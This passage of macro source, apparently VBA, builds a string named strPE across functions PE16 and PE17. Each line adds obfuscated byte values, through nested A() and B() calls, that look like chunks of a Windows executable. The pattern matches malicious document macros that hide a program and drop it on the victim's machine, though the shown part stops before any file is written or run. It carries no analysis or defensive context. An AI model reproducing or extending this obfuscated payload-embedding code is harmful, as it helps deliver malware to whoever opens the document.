    strPE = B(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(strPE, 215), 181), "~D"), 232), "q"), 255), 0), 0), 192), "F@"), 139), "N@"), 137), "VDJC"), 20), 11), 200), 139), 194), 137), "N5"), 139), 8), 34), 11), 223), "W"), 139), 200), 16), ".QR"), 137), "F*"), 232), "j"), 21), 148), 0), 137), "Q")
    strPE = B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(B(strPE, "W"), 139), "ND"), 139), 205), 137), "F@"), 139), "E"), 178), 156), 194), "b"), 192), "y"), 183), 129), 209), "`"), 161), 214), 173), 137), "V@"), 137), "ND"), 222), "T"), 132), 28), 139), "$"), 131), 141), 131), 10), 244), 215), 11), "*!E"), 20), 137), "V,")
    strPE = A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(B(strPE, "<"), 247), 0), 0), 4), "aN(#"), 194), "t"), 16), 139), 177), 246), 197), 4), "t"), 9), 199), "F"), 12), 6), 0), 0), 0), 235), 183), 139), "A"), 227), 193), 16), "t"), 9), 199), "F"), 12), 2), 0), 0), 193), 141), ","), 246), 152), "@t"), 9), 199)
    strPE = A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(B(strPE, "FG"), 3), "a"), 0), 0), "7"), 30), 139), "K"), 20), 133), 201), "ui"), 139), "K"), 24), 133), 201), "j"), 13), 139), "N("), 139), "~,"), 11), 207), 189), 3), 197), "U"), 12), 190), "V"), 8), 132), 19), 10), "]"), 199), "F"), 8), 0), 0), 0), 16), 183)
    strPE = A(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(strPE, 12), "e"), 199), 193), 231), 4), 220), 0), 0), 133), 235), "t"), 4), 133), 192), "t"), 7), 199), "F"), 4), "q"), 129), 0), 0), 139), "E"), 12), "_^[]"), 235), 1), 144), "U"), 139), 236), 131), 236), "4V"), 181), 139), "}"), 16), "y"), 175), ","), 132), 192)
    strPE = A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(strPE, "t"), 14), "W"), 232), 216), 17), 0), 0), 133), "."), 15), 133), 243), 0), 25), 25), 6), "O"), 251), ">E"), 204), 198), 213), 255), 21), 188), 192), "@"), 0), 133), 192), "u"), 234), 139), "5"), 152), 173), "@@"), 255), 215), 133), 192), 15), 132), 162), 0), 0), 0)
    strPE = A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(strPE, 255), 214), "_"), 215), 128), 252), 10), 0), "^"), 139), 229), "]"), 194), 12), 134), 139), "U"), 12), 139), "Y"), 8), 168), 141), "E"), 204), "E"), 1), "P"), 136), 232), 220), 159), 255), 255), 139), "F"), 12), 5), 196), 16), 222), 140), 1), "u("), 139), 238), "kQ"), 255)
    strPE = B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(strPE, 21), "H"), 192), "@"), 0), 133), 192), "t"), 21), 131), 194), 2), 17), 9), 199), "F"), 12), 3), 0), 0), 146), 235), 12), 131), 248), 3), "u"), 7), 199), "F"), 12), 5), "["), 0), 0), 139), 195), "3"), 201), 137), 22), 139), "G "), 139), "U"), 17), 137), "EP")
    strPE = A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(strPE, 139), "E"), 252), 187), 11), 200), 139), 132), 199), 137), ","), 24), 139), "M"), 232), 128), 204), 244), "]"), 219), 186), "N "), 192), "M"), 12), 137), "F"), 4), "o"), 211), 247), 153), 137), "V"), 28), 139), "U"), 250), "#"), 200), 137), 34), "v"), 247), 193), 255), 255), 255), 253)
    strPE = B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(strPE, "[t"), 24), 139), "G"), 186), "jZQPV"), 133), 216), 246), 255), 255), 131), 196), 16), "_^"), 139), 165), "]"), 194), 12), 0), "3"), 192), "_^"), 139), 229), "]"), 194), 236), 0), 214), 144), 144), 215), 168), 19), 219), "W"), 139), 224), 16), "j$")
    strPE = A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(strPE, "W"), 232), "'"), 168), 255), 255), 139), "u"), 8), 138), "M"), 12), "A"), 6), 137), "8"), 184), 2), "C"), 175), 0), 132), 200), "t"), 30), 139), 6), "j"), 0), "j"), 1), "j"), 18), "j"), 0), "2@"), 4), 1), "?"), 0), 0), 255), "~"), 0), 192), "@"), 0), 139), 14)
    strPE = A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(strPE, " T"), 8), 235), "6-=}"), 8), "A"), 0), 17), "|"), 23), 139), 22), 131), 194), 12), "R"), 255), 21), "6"), 192), "@"), 0), 238), 6), 190), "@"), 4), 12), 0), 0), 0), "k"), 205), 139), 14), "j"), 0), "j"), 216), "j"), 0), 137), "A>"), 192), 21)
    strPE = B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(A(strPE, 167), "w@"), 0), 139), 22), 137), "B"), 8), 139), "6; W@"), 0), "h"), 128), 174), "@"), 0), "x"), 139), "6P"), 232), 148), 179), "^"), 255), 27), "3"), 192), "^]"), 194), 12), 241), 144), 144), 144), 144), 169), 144), 144), 144), 132), 144), 143), "~")
    strPE = B(A(B(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(B(strPE, "U"), 139), 236), 139), "u"), 209), "mH"), 4), 133), 201), "u"), 21), 199), "@"), 4), 255), 160), "["), 28), 131), 192), 12), 251), 255), 180), "<"), 192), "@"), 13), "3"), 192), 2), 195), 139), "@NP=2t"), 192), "@"), 0), 201), 192), "u"), 238), "V+")

    PE16 = strPE
End Function

Private Function PE17() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(strPE, "5"), 152), 192), 147), 153), 255), "O"), 133), 168), 240), 3), "^"), 153), 195), 255), 186), "o"), 128), 252), 141), 0), "^]U"), 188), 144), 165), 144), 144), 196), "U"), 139), 236), 139), "E"), 8), 139), "H"), 207), 133), 201), 141), 16), 131), 21), 12), "P"), 255), 17), 22)
    strPE = A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(strPE, 192), "@"), 0), "3"), 192), "]"), 194), 4), 0), 139), 20), 8), "w"), 219), "P"), 255), 21), 156), 192), "@"), 0), 129), 192), "t"), 234), "="), 128), 0), 0), 0), "t"), 227), "="), 2), "="), 0), 148), "Vu"), 10), "k"), 137), 17), 1), 0), "^]"), 194), 4), 0)
    strPE = A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(strPE, 139), "5"), 152), 241), "@"), 0), 255), 8), 133), 192), "u"), 5), 167), "]"), 194), 4), "*"), 203), 214), 5), 128), "~"), 139), 0), "^]>"), 247), 0), 144), 173), "V"), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), "U"), 215), 236), 139), "M4"), 241), 24)
    strPE = A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(B(strPE, "A"), 4), 133), 192), "u"), 17), 131), 193), 12), "Q"), 255), 21), ",_e"), 0), "3r^]"), 194), 4), 0), 131), 248), 1), "u"), 139), 238), "A"), 134), "P"), 255), "P0<@"), 0), 235), 15), 243), 23), 2), "u"), 237), 139), "I"), 8), "Q"), 255)
    strPE = B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(strPE, 21), "4"), 192), "@2"), 12), 192), "u"), 213), 139), "5"), 152), 137), "b"), 0), 255), 214), 133), 192), "t"), 201), 255), 214), 5), 128), 252), 10), 0), "^]"), 194), 4), 0), 144), 180), 144), 144), 144), "U"), 139), 236), 139), "E"), 8), "h"), 128), 3), "@"), 0), "P")
    strPE = A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 139), 0), 210), 206), 12), 179), 255), 255), "]"), 224), 4), 153), 192), 210), 144), 144), 144), 144), 144), 144), 31), 192), 194), 4), 0), 144), 144), 17), 144), 144), 144), 144), 135), 144), 207), 144), "9"), 139), 236), 139), ":"), 8), 139), "@"), 20), 167), 192), "H3"), 139)
    strPE = A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(B(strPE, "z"), 12), "Q"), 242), 255), 21), "["), 192), "@"), 0), 21), 24), "u"), 30), "V"), 139), "5"), 152), 192), "@"), 0), 255), 214), 133), 192), "u"), 5), "^]"), 194), 204), 166), 255), "D"), 5), 128), 252), 10), 0), "^]"), 194), 177), 0), "3"), 3), "]"), 194), 8), 161)
    strPE = A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(strPE, 184), ";"), 9), 158), 0), "]"), 194), "l"), 0), 144), 243), 187), 144), 144), 144), 144), "d"), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), "3"), 144), 144), "U"), 139), 236), 131), "="), 220), 8), "A"), 0), 20), "|#hJ"), 7), 247), 0), 255)
    strPE = B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(strPE, 21), 184), 192), "@"), 0), 139), "E"), 8), 218), " W@"), 0), "hp"), 197), 132), 0), 247), "("), 7), "A"), 153), "P"), 252), 161), 130), 255), 255), "3"), 165), 209), 205), 144), 144), 144), 144), 144), 199), 144), 144), 144), 144), 144), 144), 144), "h("), 7), "A")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(strPE, 0), 255), 21), "<"), 139), "@"), 0), "3"), 159), 195), 144), 144), "U"), 139), 236), 167), "E"), 8), 139), 131), 153), 34), 0), 0), 0), 192), 129), 228), 0), 144), 0), "n"), 158), 231), 169), 0), 0), "u"), 208), 184), 2), 0), 0), 0), 196), 5), 184), 1), 0), 0)
    strPE = B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(strPE, 0), "]"), 245), 190), 27), 144), 185), 191), 144), 144), "Us"), 236), "G"), 251), 20), "V"), 139), "u"), 8), 247), 216), 27), 192), 247), 216), 186), "P"), 139), 7), 20), 149), 255), 21), 156), 192), "@"), 0), 183), 192), "DE"), 20), "uK"), 165), "V,"), 141), "M")
    strPE = A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(strPE, 20), "QR"), 255), "|$"), 192), 167), 0), 162), 192), "tJ"), 139), "E_>M"), 20), 182), 143), "t"), 2), 137), 8), 238), "U"), 16), 133), 210), "t"), 11), "Q"), 232), 130), 255), 245), 255), 131), 196), 244), 137), 2), "xF"), 20), "P"), 206), 21), 19)
    strPE = B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(strPE, 192), "@"), 0), 199), "F"), 15), 0), 0), 140), "g"), 135), "u"), 17), 1), 0), "^]"), 194), 16), 0), 140), 2), 1), 0), 0), "u"), 8), 184), "."), 17), 1), 0), 143), "]"), 194), 16), 0), 139), "5"), 152), 248), "@"), 0), 255), 214), 133), 192), "u`^")
    strPE = A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(strPE, "]"), 194), 16), 0), 23), 214), 5), 22), 252), 17), 0), "^)"), 194), 16), 0), 144), "3"), 34), 199), "U"), 139), 236), 139), 129), 16), 139), "E"), 8), 133), 201), "Vt"), 0), 141), "6"), 8), 255), ";e"), 209), 17), 139), "U"), 222), 138), 10), 132), 201), 136)
    strPE = A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(strPE, 8), "t"), 9), "@B;"), 198), "r"), 254), 198), 0), 0), "^]"), 165), 12), 0), 144), "U"), 139), 236), "S"), 139), 29), 0), "<@"), 197), "yW"), 139), 30), 236), "j"), 148), "W"), 140), 211), "9\W"), 139), 240), 255), 211), 131), 178), 16), ";"), 198)
    strPE = A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(strPE, "v"), 2), 139), 164), 133), 246), "u"), 14), "j2W"), 3), 211), 233), 240), ";B"), 8), 133), 246), "t"), 255), 141), "Fz_a[]"), 194), 4), 0), 139), 14), "_!"), 176), "]"), 194), 4), 187), "'"), 144), "&"), 144), 144), 144), 144), "]"), 139)
    strPE = A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(strPE, 16), 131), 210), "Y"), 7), 139), "]"), 175), 6), 219), "W"), 199), "Ey"), 0), 0), 0), 0), "}"), 178), 139), "J"), 12), "3"), 200), 131), 164), 0), "t"), 9), 172), 30), 152), "hC"), 133), 201), "u"), 247), 141), 4), 157), 4), 0), "Q"), 0), "VC"), 255), 21)
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(B(strPE, "\"), 193), "aH"), 131), 196), 4), "{"), 248), 133), 146), 224), "}"), 244), "|6"), 139), "x"), 12), 139), 247), "+"), 199), 137), "]"), 248), "qE"), 16), 235), 3), 139), 230), 16), 139), 12), 1), "Q"), 255), 21), 12), 128), "@"), 0), 131), 196), 4), 14), 137), 6)
    strPE = B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(strPE, 139), "U"), 252), 3), 208), 139), "E"), 250), 131), 198), 4), "H"), 137), "Um"), 137), "E"), 248), "u"), 217), 139), "E"), 252), 141), "D3"), 131), "P"), 137), "E"), 252), "L*\"), 193), "@-"), 131), 196), 4), "="), 201), 133), 219), "T"), 220), 248), 23), 240), "~")
    strPE = A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(B(strPE, "T~"), 13), "xiM"), 244), "P"), 153), 139), "M"), 136), 222), "E"), 192), 137), "]"), 12), 137), "]"), 232), 235), 3), 139), "E"), 16), 139), 23), 137), "M"), 236), 141), "M"), 136), "6U"), 183), 137), "7^>"), 7), "Q"), 141), "U"), 240), "\RP"), 232)
    strPE = A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(strPE, "R"), 177), 0), 0), 139), "M"), 190), 139), "EF+_"), 131), 25), 4), 3), 240), 139), 176), 12), "H"), 215), "E"), 12), "u"), 203), 139), "}"), 0), 139), "M"), 232), 139), 3), 248), 199), 247), 143), 0), 0), 0), 136), 198), 6), 0), "+"), 240), "F"), 185), 1)
    strPE = B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(strPE, 255), 21), " "), 193), "@"), 0), 139), "k"), 248), 131), 196), "%% ^t1"), 229), 193), 139), 200), 218), 192), 133), 219), "~"), 26), 139), 204), 135), 3), 209), 137), 20), 135), "@;"), 195), ";"), 243), 139), "M"), 8), 139), 195), 137), "9_[b")
    strPE = A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(B(A(strPE, 229), "]"), 195), "cU"), 159), 26), 195), 137), ":_["), 139), 229), 0), "+"), 139), "E"), 17), 244), "8"), 252), 248), "_["), 139), 229), "]"), 255), 144), 144), 144), 163), 144), "U"), 139), 170), 161), 220), 8), "A"), 0), "V"), 133), 192), 222), 15), 133), 233), 1)
    strPE = B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(strPE, 0), 0), "h"), 248), "VA"), 0), 199), 5), 248), 7), "A"), 0), 148), 0), 0), 0), 255), 21), 141), 192), "@"), 0), 161), 155), 234), "A"), 217), 131), 248), 2), 15), 133), "8"), 1), 0), 0), 160), 12), 8), "A"), 0), 190), 12), "uA"), 0), 132), 192), "t")
    strPE = A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(B(strPE, ";"), 139), "=h"), 193), "@"), 0), 186), "t"), 193), "A"), 0), 131), "8"), 1), "~"), 14), "3"), 201), "j"), 4), 138), 14), "Q"), 255), "%"), 131), 196), 213), 235), 17), "Kx"), 193), 10), 0), "3"), 210), 223), 22), 139), 8), 138), 4), "Q"), 131), 224), "c"), 133), 192)
    strPE = A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(strPE, "u6"), 138), "F"), 1), "F"), 132), 162), "u"), 223), 139), 13), 224), 8), "A"), 0), 161), 162), 7), "A"), 0), 131), 248), 10), ")"), 10), "_"), 1), 0), 0), 15), 132), 162), 1), 0), 8), 134), 248), 4), "ue"), 159), 152), 155), "sE"), 228), "("), 0), 0)
    strPE = B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(strPE, 0), 217), "J"), 1), 0), 0), 128), ">"), 0), "t"), 205), 238), 255), 21), "l"), 193), "B"), 0), 13), 200), 131), 196), 4), 137), 13), 224), 8), "A"), 0), 1), 191), "w"), 149), 184), 141), 0), "["), 0), 233), 131), "Y"), 217), 0), 131), 249), 3), "w"), 10), 29), "+")
    strPE = A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 233), 22), 1), 0), 0), 131), 249), 4), "w"), 10), 184), ","), 28), "k"), 210), 233), 7), 1), 0), 0), 186), "|"), 0), 0), 0), ";"), 2), 27), "R"), 247), "O"), 131), 192), "-P"), 244), "G"), 0), 0), 131), 248), 5), "qU"), 161), 0), 194)
    strPE = A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(strPE, "A"), 0), 133), 192), "u"), 223), 133), 201), 221), "7"), 184), "T"), 140), 0), 0), 233), 216), 0), 0), 0), "3"), 192), 247), 249), 1), 15), 149), 192), 131), 192), "3"), 233), "$"), 0), 230), 176), 131), 248), 2), "u"), 10), 184), "F"), 27), 0), 0), 233), 185), 0), 0)
    strPE = B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 0), 131), 249), 183), "s"), 10), 184), 254), 0), 0), 0), 233), 170), 0), "A"), 0), "3"), 192), 136), 248), 1), 15), 149), 192), 131), 162), "="), 233), 154), 0), 0), 0), 131), 232), 6), 247), 216), 27), 192), 236), 236), 131), 192), "P"), 233), 234), 0), 0), 0), "X")
    strPE = B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(strPE, "="), 1), "u"), 127), 229), 12), 8), "A"), 0), 190), 12), 8), "A"), 0), 132), 199), "t;"), 139), "="), 127), 193), "@"), 0), 161), "tT@"), 168), 131), "8"), 220), "~"), 14), "Q"), 158), "j"), 1), 138), 14), "$"), 255), 215), 131), 34), 195), 235), 17), 161), "x")
    strPE = A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(strPE, 193), "@"), 0), 202), 210), 138), 22), 139), 8), "_"), 4), "Q"), 131), 224), 146), 133), 192), "u"), 8), 138), "F"), 1), "F"), 132), 192), "u"), 203), 161), 0), 8), "A "), 131), 248), 10), "$"), 16), 138), 14), "3"), 155), 128), 156), 148), 15), 157), 199), 141), "D"), 0)
    strPE = B(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(strPE, 5), 186), "!"), 131), 248), 232), "s"), 16), 138), 157), "3v"), 128), 249), "A"), 139), 157), 208), "[D"), 231), 14), 235), 12), 184), 18), 0), "b"), 0), 235), 5), 184), "1"), 231), 0), 23), 163), 220), 8), "A"), 0), 139), "U"), 8), "_"), 191), 2), 139), "5v")
    strPE = A(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(strPE, 8), "A"), 148), "3"), 192), 131), 254), 1), 15), 157), 136), "H^%"), 236), "P"), 0), 0), "]"), 195), 144), 144), "s"), 144), 127), 144), 146), 206), "U"), 139), 236), 139), "EXV+"), 233), 133), 228), 8), "A"), 21), 141), "4"), 133), 228), 8), "A"), 202), 133)
    strPE = A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(strPE, 201), "u"), 23), 139), 4), 133), 155), "D@"), 0), "P"), 255), 21), 232), 192), 229), 0), 133), 192), 29), 6), "u"), 3), 217), "]"), 195), 139), 163), 16), 133), 192), "t"), 248), 139), 14), "PQ"), 255), 21), 28), 192), 146), 0), "^]"), 18), 139), 168), "z"), 139)
    strPE = B(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(strPE, 6), "RP"), 3), 21), 28), 192), "@"), 0), "^]"), 232), 236), 144), 144), 144), 144), "o"), 144), 144), "A"), 140), 144), 144), "U"), 139), 186), 131), 236), 20), "SVW"), 139), "}"), 12), 139), 23), "`"), 210), 137), "U"), 248), "u"), 14), 22), "^3"), 192), "[")
    strPE = A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(strPE, 139), 229), "]"), 253), 16), 0), 139), "U"), 248), 139), "M"), 20), 131), "9ot"), 234), "+u"), 241), "3"), 192), 196), 6), "F"), 132), 250), 137), "uUx"), 25), "J"), 137), 23), 139), 17), "J"), 137), 17), 139), "M8f"), 137), 1), 131), 193), 2), 137)
    strPE = B(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "M"), 16), 233), 200), 1), 255), 0), 139), 200), 216), 225), 192), 0), 0), 0), 128), 249), 192), 15), 133), 3), 0), 0), 0), 153), "("), 224), 0), 0), 0), 139), 200), 137), "U"), 240), "#"), 136), "3"), 219), 190), 1), 0), 0), 0), "#"), 210), ";"), 207), 137), "E")
    strPE = A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(strPE, 3), 137), 26), 236), 214), 24), ";"), 211), "u0"), 139), 199), 139), 227), 185), 1), 0), 0), 249), ","), 30), 13), "e"), 0), 195), 248), 11), 218), "F"), 131), 254), 3), 137), "&"), 252), "/p"), 139), "E"), 236), 139), "M"), 240), "#"), 199), 5), 203), 188), 199), 140)
    strPE = A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(strPE, 4), ";"), 220), "t"), 211), 139), "_"), 212), "lU"), 225), 139), 203), 187), 209), 139), 220), "#"), 202), 34), "U"), 252), 247), 214), "#"), 240), 26), "B"), 1), "&"), 134), 244), 139), "E"), 248), ";"), 194), 15), 134), "Y"), 1), 0), 0), 131), 142), 1), 139), 198), "u"), 23)
    strPE = A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 131), 209), 30), 247), 255), 11), 199), 145), "g_^"), 184), 22), 0), 0), "+["), 139), 229), 142), 194), 16), 0), 11), 193), "u"), 30), 139), "U"), 8), 15), 164), 251), 1), 158), 2), 238), " $?%"), 255), 162), 0), 10), 153), "#"), 133), "#"), 211)
    strPE = A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(strPE, 11), 194), "t"), 211), 139), "U"), 252), 131), 250), 194), "u"), 17), "%"), 254), 13), "u-"), 133), "ru)"), 139), "E"), 8), 246), 0), " "), 235), 31), 131), 250), 210), "ut"), 133), "@"), 238), 177), "|"), 5), 131), 254), 4), "0"), 170), "D"), 254), 130), "u"), 12)
    strPE = B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(strPE, 11), 201), "u"), 8), 139), 26), 8), 246), 0), 171), "u"), 153), 139), "}"), 159), 184), 2), 0), 0), 15), ";"), 251), 139), 206), 27), 192), 247), 216), "@;"), 207), 15), "F"), 170), 226), 255), 255), 220), 248), "t?"), 139), "}"), 8), 235), 3), 139), "U"), 252), "3")
    strPE = A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(strPE, 192), "J"), 138), 7), 137), "U"), 252), 139), 208), 129), 226), 192), 0), "b"), 0), "G"), 128), 250), 128), 137), "q"), 8), 15), "3W"), 255), "w"), 255), 15), 164), 241), 6), 1), 224), "?"), 153), 193), 230), 6), 11), 198), 11), 209), 139), 240), 139), "E*"), 133), 192)
